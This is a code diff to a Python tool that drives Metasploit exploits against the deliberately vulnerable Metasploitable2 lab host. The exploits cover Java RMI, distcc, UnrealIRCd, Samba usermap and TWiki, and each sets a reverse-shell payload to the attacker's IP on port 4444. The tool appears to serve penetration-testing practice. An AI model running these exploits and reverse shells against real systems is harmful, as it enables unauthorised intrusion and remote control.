@@ -97,6 +97,7 @@ class PyMetasploit:
                         self.payload.modulename in v["via_payload"]:
                     print(f"Found Session Id: {k}")
                     sid = k
+                    break
             if sid is not None:
                 break
             else:
@@ -280,7 +281,7 @@ class Metasploitable2(VictimHost):
         metasploit.set_exploit(
             name="multi/misc/java_rmi_server", rhosts=self.victim_ip, rport=1099)
         metasploit.set_payload(
-            name="java/shell/reverse_tcp", lhost=metasploit.attacker_ip)
+            name="java/shell/reverse_tcp", lhost=metasploit.attacker_ip, lport=4444)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
@@ -294,7 +295,7 @@ class Metasploitable2(VictimHost):
         metasploit.set_exploit(name="unix/misc/distcc_exec",
                                rhosts=self.victim_ip, rport=3632)
         metasploit.set_payload(name="cmd/unix/reverse",
-                               lhost=metasploit.attacker_ip)
+                               lhost=metasploit.attacker_ip, lport=4444)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
@@ -308,7 +309,7 @@ class Metasploitable2(VictimHost):
         metasploit.set_exploit(
             name="unix/irc/unreal_ircd_3281_backdoor", rhosts=self.victim_ip, rport=6667)
         metasploit.set_payload(name="cmd/unix/reverse",
-                               lhost=metasploit.attacker_ip)
+                               lhost=metasploit.attacker_ip, lport=4444)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
@@ -322,7 +323,7 @@ class Metasploitable2(VictimHost):
         metasploit.set_exploit(
             name="multi/samba/usermap_script", rhosts=self.victim_ip, rport=139)
         metasploit.set_payload(name="cmd/unix/reverse",
-                               lhost=metasploit.attacker_ip)
+                               lhost=metasploit.attacker_ip, lport=4444)
         metasploit.set_console()
         metasploit.run(victim_ip=victim_ip)
 
@@ -336,7 +337,7 @@ class Metasploitable2(VictimHost):
         metasploit.set_exploit(
             name="unix/webapp/twiki_history", rhosts=self.victim_ip, rport=80)
         metasploit.set_payload(name="cmd/unix/reverse",
-                               lhost=metasploit.attacker_ip)
+                               lhost=metasploit.attacker_ip, lport=4444)
         metasploit.set_console()
         metasploit.run(victim_ip=self.victim_ip)
 
@@ -402,7 +403,7 @@ def exploit_menu(victim: VictimHost) -> Optional[Callable[[PyMetasploit], None]]
         text += f"{k}\t| {v}\n"
     text += "Selected: "
     while True:
-        selected = input(f"Select the exploit to use:\n{text}")
+        selected = input(f"Select the exploit to use or exit:\n{text}")
         if selected.lower() == "exit":
             break
         for k, v in victim.available_exploits.items():
@@ -421,9 +422,9 @@ if __name__ == "__main__":
 
     while True:
         try:
-            exploit = exploit_menu(metasploitable2)
-            if exploit:
-                exploitation = exploit(metasploit)
+            selected_exploitation = exploit_menu(metasploitable2)
+            if selected_exploitation:
+                selected_exploitation(metasploit)
                 action = default_input(
                     "Continue exploiting? [Y/n]: ", default="Y")
                 if action in ["n", "N"]:
